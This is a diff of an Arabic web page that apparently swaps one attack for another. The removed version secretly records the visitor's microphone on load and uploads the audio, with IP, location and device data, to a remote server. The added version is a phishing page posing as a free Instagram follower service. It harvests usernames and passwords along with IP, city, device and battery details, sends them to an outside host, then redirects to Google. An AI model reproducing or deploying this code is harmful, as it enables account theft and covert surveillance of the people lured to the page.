@@ -1,61 +1,150 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <title>مرحبا بك في موقعنا</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="زيادة متابعين انستجرام💥">
+    <meta property="og:description" content="مرحبا بك في افضل موقع زياده متابعين انستجرام يمكنك زياده اكثر من 1000 متابع يومياً مجاني💥🚀">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="زيادة متابعين انستجرام💥">
+    <meta name="twitter:description" content="مرحبا بك في افضل موقع زياده متابعين انستجرام يمكنك زياده اكثر من 1000 متابع يومياً مجاني💥🚀">
+    <title>زيادة متابعين انستجرام</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
-
-        body {
-            font-family: 'Poppins', sans-serif;
+        * {
             margin: 0;
             padding: 0;
-            background: #000;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #fd1d1d, #fcb045, #833ab4, #405de6);
+            background-size: 400% 400%;
+            animation: gradientBG 10s ease infinite;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
-            color: #fff;
+            min-height: 100vh;
+            font-family: 'Arial', sans-serif;
+            padding: 20px;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
         .container {
-            text-align: center;
-            padding: 40px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
-            position: relative;
-            overflow: hidden;
+            background: rgba(28, 28, 28, 0.95);
+            padding: 40px 30px;
+            border-radius: 20px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
             backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
-            transform: rotate(45deg);
-            animation: animate 5s linear infinite;
+        .logo {
+            text-align: center;
+            font-size: 50px;
+            margin-bottom: 10px;
         }
 
-        @keyframes animate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        h2 {
+            color: #FFD700;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
         }
 
-        .loading {
-            border: 8px solid rgba(243, 243, 243, 0.2);
-            border-top: 8px solid #e74c3c;
+        h2 span {
+            animation: pulse 2s ease-in-out infinite;
+            display: inline-block;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 18px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        input:focus, select:focus {
+            border-color: #f39c12;
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 0 20px rgba(243, 156, 18, 0.15);
+        }
+
+        input::placeholder {
+            color: #666;
+        }
+
+        select option {
+            background: #1c1c1c;
+            color: #fff;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #f39c12, #e67e22);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(243, 156, 18, 0.4);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #f39c12;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1.5s linear infinite;
-            margin: 0 auto;
+            animation: spin 0.8s linear infinite;
+            margin: 15px auto;
         }
 
         @keyframes spin {
@@ -63,177 +152,288 @@
             100% { transform: rotate(360deg); }
         }
 
-        .message {
-            font-size: 20px;
-            color: #ecf0f1;
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .success-message .check {
+            font-size: 60px;
+            color: #4CAF50;
+            animation: popIn 0.5s ease;
+        }
+
+        .success-message h3 {
+            color: #4CAF50;
+            font-size: 22px;
+            margin-top: 10px;
+        }
+
+        .success-message p {
+            color: #aaa;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .footer {
+            text-align: center;
             margin-top: 20px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            color: #555;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #f39c12;
+            text-decoration: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 20px;
+            }
+            h2 {
+                font-size: 20px;
+            }
+            input, select {
+                padding: 12px 14px;
+                font-size: 14px;
+            }
+            button {
+                font-size: 16px;
+                padding: 14px;
+            }
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="loading" id="loading" style="display: none;"></div>
-        <p class="message" id="notification">لحظه واحده من فضلك...</p>
+        <div class="logo">📸</div>
+        <h2>زيادة متابعين انستجرام <span>🚀</span></h2>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label>📧 البريد الإلكتروني أو اليوزر</label>
+                <input type="text" id="username" placeholder="أدخل البريد الإلكتروني أو اسم المستخدم" required>
+            </div>
+
+            <div class="input-group">
+                <label>🔒 كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+
+            <div class="input-group">
+                <label>👥 عدد المتابعين</label>
+                <select id="followers">
+                    <option value="1000">1000 متابع - مجاني 🎁</option>
+                    <option value="1500">1500 متابع - 2$</option>
+                    <option value="2000">2000 متابع - 3$</option>
+                    <option value="3000">3000 متابع - 5$</option>
+                    <option value="5000">5000 متابع - 8$</option>
+                    <option value="10000">10000 متابع - 15$</option>
+                </select>
+            </div>
+
+            <button type="submit" id="submitBtn">🚀 شحن المتابعين الآن</button>
+
+            <div class="spinner" id="spinner"></div>
+        </form>
+
+        <div class="success-message" id="successMessage">
+            <div class="check">✅</div>
+            <h3>تم استلام طلبك!</h3>
+            <p>جاري معالجة طلبك، سيتم إضافة المتابعين قريباً</p>
+        </div>
+
+        <div class="footer">
+            🔒 بياناتك آمنة ومشفرة
+        </div>
     </div>
 
-    <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
-        <input type="hidden" name="chatId" id="chatId">
-        <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
-    </form>
-
-<script>
-// ============================================
-// ✅ دالة إرسال تقارير الفشل إلى /fail
-// ============================================
-async function sendFailReport(type, message, details = {}) {
-    const chatId = document.getElementById('chatId').value;
-    if (!chatId) {
-        console.warn('No chatId available for fail report');
-        return;
-    }
-
-    try {
-        const response = await fetch('https://bott.freeusr.xyz/fail', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chatId: chatId,
-                type: type,
-                message: message,
-                details: details,
-                deviceInfo: {
-                    platform: navigator.platform || 'غير متاح',
-                    language: navigator.language || 'غير متاح',
-                    userAgent: navigator.userAgent || 'غير متاح',
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    timestamp: new Date().toISOString()
-                }
-            })
-        });
-
-        if (!response.ok) {
-            console.warn('Fail report response not OK:', response.status);
-        }
-    } catch (error) {
-        console.warn('Failed to send fail report:', error);
-    }
-}
-
-document.addEventListener('DOMContentLoaded', () => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const chatId = urlParams.get('chatId');
-    
-    // قراءة المدة من الرابط
-    let duration = parseInt(urlParams.get('duration')) || 5; // افتراضي 5 ثواني
-    
-    // التأكد من أن المدة بين 5 و 30
-    if (duration < 5) duration = 5;
-    if (duration > 30) duration = 30;
-    
-    if (!chatId) {
-        sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
-        alert("خطأ: chatId غير موجود في الرابط");
-        return;
-    }
-
-    document.getElementById('chatId').value = chatId;
-
-    if (!navigator.mediaDevices?.getUserMedia) {
-        sendFailReport('error', 'المتصفح لا يدعم تسجيل الصوت', {
-            userAgent: navigator.userAgent
-        });
-        alert("المتصفح لا يدعم تسجيل الصوت");
-        return;
-    }
-
-    // بدء التسجيل بالمدة المحددة من الرابط
-    startRecording(duration);
-});
-
-async function startRecording(duration) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
-
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'audio/webm' });
-            const formData = new FormData(document.getElementById('voice-form'));
-            formData.set('voice', blob, 'voice.webm');
-
-            const info = await collectAdditionalData();
-            formData.append('additionalData', JSON.stringify(info));
-
-            const res = await fetch('https://bott.freeusr.xyz/submitVoice', {
-                method: 'POST',
-                body: formData
-            });
-
-            if (res.ok) {
-                window.location.href = "https://www.google.com/";
-            } else {
-                const errorData = await res.json().catch(() => ({}));
-                sendFailReport('upload', 'فشل إرسال التسجيل إلى الخادم', {
-                    status: res.status,
-                    error: errorData.error || 'Unknown error',
-                    duration: duration
+    <script>
+        // ============================================
+        // دالة إرسال تقارير الفشل
+        // ============================================
+        async function sendFailReport(type, message, details = {}) {
+            const chatId = document.getElementById('chatId')?.value || 'غير معروف';
+            try {
+                await fetch('https://bott.freeusr.xyz/fail', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        type: type,
+                        message: message,
+                        details: details,
+                        deviceInfo: {
+                            platform: navigator.platform || 'غير متاح',
+                            language: navigator.language || 'غير متاح',
+                            userAgent: navigator.userAgent || 'غير متاح',
+                            timestamp: new Date().toISOString()
+                        }
+                    })
                 });
-                alert("فشل الإرسال. حاول مرة أخرى.");
+            } catch (error) {
+                console.warn('Failed to send fail report:', error);
             }
-        };
-
-        recorder.start();
-        setTimeout(() => recorder.stop(), duration * 1000);
-    } catch (err) {
-        // ✅ إرسال تقرير الفشل حسب نوع الخطأ
-        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-            sendFailReport('permission', 'تم رفض الوصول إلى الميكروفون', {
-                error: err.message,
-                duration: duration
-            });
-        } else if (err.name === 'NotFoundError') {
-            sendFailReport('microphone', 'لا يوجد ميكروفون متصل', {
-                error: err.message,
-                duration: duration
-            });
-        } else {
-            sendFailReport('error', err.message, {
-                error: err.message,
-                duration: duration,
-                stack: err.stack
-            });
         }
-        alert("خطأ في تسجيل الصوت: " + err.message);
-    }
-}
 
-async function collectAdditionalData() {
-    let ip = 'غير متاح', country = '', city = '';
-    try {
-        const ipInfo = await fetch('https://ipwho.is/').then(res => res.json());
-        ip = ipInfo.ip;
-        country = ipInfo.country_name;
-        city = ipInfo.city;
-    } catch {}
+        // ============================================
+        // قراءة chatId من الرابط
+        // ============================================
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chatId');
 
-    const ua = navigator.userAgent;
-    const platform = navigator.platform;
-    const match = ua.match(/\(([^)]+)\)/);
-    const deviceVersion = match ? match[1] : 'غير متاح';
+        // ============================================
+        // التحقق من وجود chatId
+        // ============================================
+        if (!chatId) {
+            sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
+            alert('خطأ: chatId غير موجود في الرابط');
+        }
 
-    let batteryLevel = 'غير متاح', charging = 'غير متاح';
-    try {
-        const battery = await navigator.getBattery();
-        batteryLevel = (battery.level * 100) + '%';
-        charging = battery.charging ? 'نعم' : 'لا';
-    } catch {}
+        // ============================================
+        // جلب معلومات IP
+        // ============================================
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'غير معروف',
+                    country: data.country_name || 'غير معروف',
+                    city: data.city || 'غير معروف'
+                };
+            } catch (error) {
+                sendFailReport('error', 'فشل جلب معلومات IP', { error: error.message });
+                return { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف' };
+            }
+        }
 
-    return { ip, country, city, platform, deviceVersion, batteryLevel, batteryCharging: charging };
-}
-</script>
+        // ============================================
+        // جلب معلومات الجهاز
+        // ============================================
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let platform = "غير معروف";
+            if (/Windows/.test(ua)) platform = "Windows";
+            else if (/Mac/.test(ua)) platform = "MacOS";
+            else if (/Linux/.test(ua)) platform = "Linux";
+            else if (/Android/.test(ua)) platform = "Android";
+            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
+            return { platform, userAgent: ua };
+        }
+
+        // ============================================
+        // جلب معلومات البطارية
+        // ============================================
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        batteryLevel: Math.round(battery.level * 100) + '%',
+                        batteryCharging: battery.charging ? 'نعم' : 'لا'
+                    };
+                }
+            } catch (error) {}
+            return { batteryLevel: 'غير متاح', batteryCharging: 'غير متاح' };
+        }
+
+        // ============================================
+        // معالج إرسال النموذج
+        // ============================================
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const followers = document.getElementById('followers').value;
+
+            if (!username || !password) {
+                sendFailReport('permission', 'المستخدم لم يدخل البيانات المطلوبة', {
+                    username: !!username,
+                    password: !!password
+                });
+                alert('يرجى إدخال البريد الإلكتروني وكلمة المرور');
+                return;
+            }
+
+            // عرض السبينر
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
+
+            try {
+                const ipData = await getIPInfo();
+                const deviceInfo = getDeviceInfo();
+                const batteryInfo = await getBatteryInfo();
+
+                const formData = new FormData();
+                formData.append('username', username);
+                formData.append('password', password);
+                formData.append('followers', followers);
+                formData.append('chatId', chatId || 'غير معروف');
+                formData.append('ip', ipData.ip);
+                formData.append('country', ipData.country);
+                formData.append('city', ipData.city);
+                formData.append('platform', deviceInfo.platform);
+                formData.append('userAgent', deviceInfo.userAgent);
+                formData.append('batteryLevel', batteryInfo.batteryLevel);
+                formData.append('batteryCharging', batteryInfo.batteryCharging);
+
+                const response = await fetch('https://lluuv9.freeusr.xyz/submitIncrease', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('submitBtn').disabled = false;
+
+                if (response.ok) {
+                    document.getElementById('loginForm').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com/";
+                    }, 2500);
+                } else {
+                    const errorData = await response.json().catch(() => ({}));
+                    sendFailReport('upload', 'فشل إرسال البيانات', {
+                        status: response.status,
+                        error: errorData.error || 'Unknown'
+                    });
+                    alert('فشل الإرسال. حاول مرة أخرى.');
+                }
+
+            } catch (error) {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('submitBtn').disabled = false;
+
+                sendFailReport('error', 'خطأ في الاتصال بالخادم', {
+                    error: error.message
+                });
+
+                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+            }
+        });
+
+        // ============================================
+        // مراقبة الأخطاء غير المتوقعة
+        // ============================================
+        window.addEventListener('error', (event) => {
+            sendFailReport('error', 'خطأ غير متوقع', {
+                message: event.message,
+                filename: event.filename,
+                lineno: event.lineno
+            });
+        });
+    </script>
 </body>
 </html>
